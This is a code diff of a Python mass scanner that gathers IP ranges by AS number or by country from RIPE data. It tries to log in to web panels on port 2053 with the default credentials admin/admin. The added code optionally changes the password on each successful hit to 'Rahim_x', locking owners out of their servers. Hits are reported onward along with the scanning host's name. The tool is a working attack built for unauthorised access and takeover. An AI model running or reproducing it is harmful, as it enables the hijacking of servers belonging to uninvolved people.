@@ -5,12 +5,8 @@ from ping3 import ping
 import platform
 import ipaddress
 from tqdm import tqdm
-
-
-
-# Set the timeout for requests
-# please set by network status
-timeout = 1
+from concurrent.futures import ThreadPoolExecutor
+from collections import deque
 
 
 time1 = time()
@@ -46,13 +42,13 @@ def loger(ip, port, text):
     """
     with open("data/log.txt", "a+") as file:
         file.write(f"{ip}:{port} is {text} ({timer()})\n")
-        file.close()
+
 
     if text == True:
         with open("data/index.html", "a+") as T:
             T.write(f"{ip}:{port} ({timer()})<br/>\n")
             T.close()
-            send_t(f"http://{ip}:{port} ({timer()} CLI , {platform.system(), platform.release()})")
+            send_t(f"http://{ip}:{port} ({timer()} CLI , {platform.system(), platform.uname().node})")            
 
         with open("data/true.txt", "a+") as T2:
             T2.write(f"{ip}:{port}\n")
@@ -64,15 +60,17 @@ def loger(ip, port, text):
         with open("data/iunknown.html", "a+") as T:
             T.write(f"{ip}:{port} is {text} ({timer()})<br/>\n")
             T.close()
-            send(f"{ip}:{port} is {text} ({timer()} CLI on {platform.system(), platform.release()})")
+            send(f"{ip}:{port} is {text} ({timer()} CLI on {platform.system(), platform.uname().node})")
 loger("info", "", "loger started")
 
-def get_ip_ranges_from_as(as_number):
-    url = f"https://api.bgpview.io/asn/{as_number}/prefixes"
-    response = requests.get(url)
-    if response.status_code != 200:
-        print("خطا در دریافت اطلاعات")
-        return []
+def get_ip_ranges_from_as(asn):
+    url = f"https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS{asn}"
+    r = requests.get(url).json()
+    return [
+        p["prefix"]
+        for p in r["data"]["prefixes"]
+        if "." in p["prefix"]  
+    ]
 
     data = response.json()
     prefixes = data.get("data", {}).get("ipv4_prefixes", [])
@@ -89,6 +87,36 @@ def save_ips_from_ranges(prefixes, filename):
                 print(f"خطا در پردازش {prefix}: {e}")
 
 
+def get_ip_ranges_by_country(country_code):
+    url = "https://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest"
+    response = requests.get(url)
+    if response.status_code != 200:
+        print("خطا در دریافت اطلاعات RIPE")
+        return []
+
+    networks = []
+    for line in response.text.splitlines():
+        if f"|{country_code.upper()}|ipv4|" in line:
+            parts = line.split("|")
+            if len(parts) > 4:
+                ip_start = parts[3]
+                count = int(parts[4])
+                try:
+                    for net in ipaddress.summarize_address_range(
+                        ipaddress.IPv4Address(ip_start),
+                        ipaddress.IPv4Address(int(ipaddress.IPv4Address(ip_start)) + count - 1)
+                    ):
+                        networks.append(net)
+                except Exception as e:
+                    print(f"خطا در پردازش {ip_start} + {count}: {e}")
+    return networks
+
+def save_ips_to_file(ranges, filename="data/ips.txt"):
+    with open(filename, "w") as f:
+        for net in ranges:
+            for ip in net.hosts():
+                f.write(str(ip) + "\n")
+
 
 def ip_to_int(ip):
     parts = list(map(int, ip.split('.')))
@@ -96,6 +124,16 @@ def ip_to_int(ip):
 
 def int_to_ip(num):
     return f"{(num >> 24) & 255}.{(num >> 16) & 255}.{(num >> 8) & 255}.{num & 255}"
+
+def convert_seconds(seconds):
+    days = seconds // (24 * 3600)
+    seconds %= (24 * 3600)
+    hours = seconds // 3600
+    seconds %= 3600
+    minutes = seconds // 60
+    seconds %= 60
+    return f"{days} days, {hours} hours, {minutes} minutes, {seconds} seconds"
+
 
 def ip_range(ip1, ip2):
     try:
@@ -112,9 +150,12 @@ def ip_range(ip1, ip2):
     except ValueError:
         print("ip invalid")
 
+def count_lines(filename):
+    with open(filename, "r") as f:
+        return sum(1 for _ in f)
 
 
-inp = int(input("#Toomaj\n 1. create new ip range manually \n 2. create new ip range with AS \n 3. Continue with last ip range \n==>"))
+inp = int(input("#Toomaj\n 1. Create new ip range manually \n 2. Create new ip range with AS \n 3. Continue with last ip range \n 4. Create new ip range with country \n==> "))
 if inp == 1:
     my_file = open("data/ips.txt", "w")
     my_file.write("")
@@ -142,25 +183,58 @@ elif inp == 2 :
 
 elif inp == 3 :pass
 
+elif inp == 4 :
+    country = input("enter country code: ").strip().upper()
+    print(f"receving ip from {country} ...")
+    ip_ranges = get_ip_ranges_by_country(country)
+    if ip_ranges:
+        print(f"{len(ip_ranges)} renges found, saving... ")
+        save_ips_to_file(ip_ranges)
+        print(f"all ips saved.")
+    else:
+        print("رنجی پیدا نشد.")
+
+
 else : print("wrong input")
 
 
+total_ips = count_lines("data/ips.txt")
+print(f"number of ip is : {total_ips}")
 
+max_workers = int(input("max_workers ==>"))
+timeout = float(input("Set the timeout for requests please set by network status==>"))
+if input("change pass y/n==>").upper() == "Y":
+    change_password = True
+else : change_password = False
 
-
-
-def checker(ip: str, timeout: int, port : int):
+def checker(ip: str, timeout: float, port : int, change_password:bool):
     """
     Check if the Plesk server at the given IP address and port 2083 is accessible.
     """
     try:
-        url = f"http://{ip}:{port}/login"
+        s = requests.Session()
+        login_url = f"http://{ip}:{port}/login"
 
         data = {'username': 'admin', 'password': 'admin'}
 
-        response = requests.post(url, data, timeout=timeout)
+        response = s.post(login_url, data, timeout=timeout)
 
         response_json = response.json()
+        if change_password == True and response_json["success"]:
+            newpass = {
+            "oldUsername": "admin",
+            "oldPassword":	"admin",
+            "newUsername":	"admin",
+            "newPassword":	"Rahim_x"
+            } 
+            url = f"http://{ip}:{port}/panel/setting/updateUser"
+            change_password_st = s.post(url, newpass)
+            ch_json = change_password_st.json()
+            if ch_json["success"]:
+                return True
+            else:
+                loger((ch_json['msg']), 1, "chm")
+
 
         if response_json["success"]:
             return True
@@ -169,30 +243,37 @@ def checker(ip: str, timeout: int, port : int):
     except:
         return False
 
-
-
-with open("data/ips.txt", "r") as file:
-    ips = file.readlines()
-    print(f"Estimated time: {len(ips)}s")
-    print("start searching...")
-
-
-for ip in tqdm(ips):
+def scan_ip(ip):
     ip = ip.strip()
-    if ping(ip, timeout) is not None:
-        result53 = checker(ip, timeout, 2053)
+    result = checker(ip, timeout, 2053, change_password)
+    loger(ip, 2053, result)
 
-        if result53 == False:
-            loger(ip, 2053, False)
-        elif result53 == True:
-            loger(ip, 2053, True)
-        else:
-            loger(ip, 2053, result53)
+def batch_file(filename, batch_size):
+    with open(filename, "r") as f:
+        batch = deque()
+        for line in f:
+            ip = line.strip()
+            if ip:  
+                batch.append(ip)
+            if len(batch) == batch_size:
+                yield list(batch)
+                batch.clear()
+        if batch:
+            yield list(batch)
 
 
+print(f"Estimated time: {convert_seconds(round(timeout * (total_ips / max_workers)))} (approximate)")
+print("start searching...")
 
+pbar = tqdm(total=total_ips)
+
+for ips_batch in batch_file("data/ips.txt", 1000):
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        list(executor.map(scan_ip, ips_batch))
+    pbar.update(len(ips_batch))
+
+pbar.close()
 
 time2 = time()
-
 loger("info", "", "Done!")
-input(f"press enter to close\n result in data folder \n The time it took to complete:{round(time2-time1)} second")
+input(f"\n✅ Completed in {convert_seconds(round(time2-time1))}\n📁 Results saved in 'data/' folder\nPress Enter to exit.")
